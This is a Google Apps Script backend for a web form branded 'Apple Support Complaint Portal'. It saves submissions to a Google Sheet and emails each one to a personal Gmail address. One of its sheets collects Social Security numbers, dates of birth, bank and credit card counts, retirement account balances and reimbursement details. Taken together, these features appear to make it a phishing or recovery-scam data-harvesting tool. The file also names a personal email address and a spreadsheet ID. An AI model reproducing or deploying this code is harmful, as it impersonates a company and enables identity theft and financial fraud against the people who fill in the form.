// Google Apps Script for Apple Support Complaint Portal
// Deploy this script to Google Apps Script and get the Web App URL

// Global variables
const SPREADSHEET_ID = '1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms';
const COMPLAINTS_SHEET_NAME = 'Complaints';
const ASSET_VERIFICATION_SHEET_NAME = 'AssetVerifications';
const ADMIN_EMAIL = 'janetgunnoe09@gmail.com';

// Initialize the spreadsheet and sheets
function initializeSpreadsheet() {
  const spreadsheet = SpreadsheetApp.openById(SPREADSHEET_ID);
  
  // Create sheets if they don't exist
  if (!spreadsheet.getSheetByName(COMPLAINTS_SHEET_NAME)) {
    const complaintsSheet = spreadsheet.insertSheet(COMPLAINTS_SHEET_NAME);
    setupComplaintsSheet(complaintsSheet);
  }
  
  if (!spreadsheet.getSheetByName(ASSET_VERIFICATION_SHEET_NAME)) {
    const assetSheet = spreadsheet.insertSheet(ASSET_VERIFICATION_SHEET_NAME);
    setupAssetVerificationSheet(assetSheet);
  }
}

// Setup complaints sheet headers
function setupComplaintsSheet(sheet) {
  const headers = [
    'Timestamp',
    'Tracking Number',
    'Full Name',
    'Phone',
    'Email',
    'Apple ID',
    'Complaint Type',
    'Description',
    'Submitted',
    'Status',
    'Processing Status'
  ];
  sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
  sheet.getRange("A1:K1").setFontWeight('bold');
  sheet.autoResizeColumn(1, headers.length);
}

// Setup asset verification sheet headers
function setupAssetVerificationSheet(sheet) {
  const headers = [
    'Timestamp',
    'Reference Number',
    'Loss Type',
    'Loss Amount',
    'Description',
    'Date of Incident',
    'Authorities Contacted',
    'SSN',
    'DOB',
    'Property Count',
    'Bank Account Count',
    'Credit Card Count',
    '401k',
    '401k Balance',
    'IRA',
    'IRA Balance',
    'Money Market',
    'Money Market Balance',
    'Reimbursement Method',
    'Additional Info',
    'User Email',
    'Status'
  ];
  sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
  sheet.getRange("A1:U1").setFontWeight('bold');
  sheet.autoResizeColumn(1, headers.length);
}

// Main web app function - handle POST requests
function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);
    const sheetName = data.sheet;
    const rowData = data.data;
    
    const spreadsheet = SpreadsheetApp.openById(SPREADSHEET_ID);
    const sheet = spreadsheet.getSheetByName(sheetName);
    
    if (!sheet) {
      return ContentService.createTextOutput(JSON.stringify({
        status: 'error',
        message: 'Sheet not found: ' + sheetName
      })).setMimeType(ContentService.MimeType.JSON);
    }
    
    // Add new row to the sheet
    sheet.appendRow(rowData);
    
    // Send notification email to admin
    sendNotificationEmail(sheetName, rowData);
    
    return ContentService.createTextOutput(JSON.stringify({
      status: 'success',
      message: 'Data added successfully',
      sheet: sheetName,
      row: sheet.getLastRow()
    })).setMimeType(ContentService.MimeType.JSON);
    
  } catch (error) {
    Logger.log('Error in doPost: ' + error.toString());
    return ContentService.createTextOutput(JSON.stringify({
      status: 'error',
      message: error.toString()
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

// Send notification email to admin
function sendNotificationEmail(sheetName, rowData) {
  const subject = `New ${sheetName} Submission - ${sheetName === 'Complaints' ? rowData[1] : rowData[1]}`;
  
  let body = `A new submission has been received in the Apple Support Complaint Portal.\n\n`;
  body += `Sheet: ${sheetName}\n`;
  body += `Timestamp: ${rowData[0]}\n`;
  
  if (sheetName === 'Complaints') {
    body += `Tracking Number: ${rowData[1]}\n`;
    body += `Name: ${rowData[2]}\n`;
    body += `Email: ${rowData[4]}\n`;
    body += `Complaint Type: ${rowData[6]}\n`;
    body += `Status: ${rowData[9]}\n`;
  } else if (sheetName === 'AssetVerifications') {
    body += `Reference Number: ${rowData[1]}\n`;
    body += `Loss Type: ${rowData[2]}\n`;
    body += `Loss Amount: $${rowData[3]}\n`;
    body += `User Email: ${rowData[20]}\n`;
    body += `Status: ${rowData[21]}\n`;
  }
  
  body += `\nPlease check the Google Sheet for complete details.\n`;
  body += `Spreadsheet: https://docs.google.com/spreadsheets/d/${SPREADSHEET_ID}`;
  
  MailApp.sendEmail(ADMIN_EMAIL, subject, body);
}

// Handle GET requests (for testing)
function doGet(e) {
  return ContentService.createTextOutput(JSON.stringify({
    status: 'success',
    message: 'Apple Support Complaint Portal API is running',
    timestamp: new Date().toISOString()
  })).setMimeType(ContentService.MimeType.JSON);
}

// Setup function - run this once to initialize the spreadsheet
function setup() {
  initializeSpreadsheet();
  Logger.log('Spreadsheet initialized successfully');
}

// Test function
function testSubmission() {
  const testData = {
    sheet: 'Complaints',
    data: [
      new Date().toISOString(),
      'TEST-001',
      'Test User',
      '555-123-4567',
      'test@example.com',
      'test.apple@icloud.com',
      'Product Related',
      'Test complaint description',
      new Date().toLocaleString(),
      'pending',
      'Pending Review'
    ]
  };
  
  const spreadsheet = SpreadsheetApp.openById(SPREADSHEET_ID);
  const sheet = spreadsheet.getSheetByName('Complaints');
  sheet.appendRow(testData.data);
  
  Logger.log('Test submission completed');
}
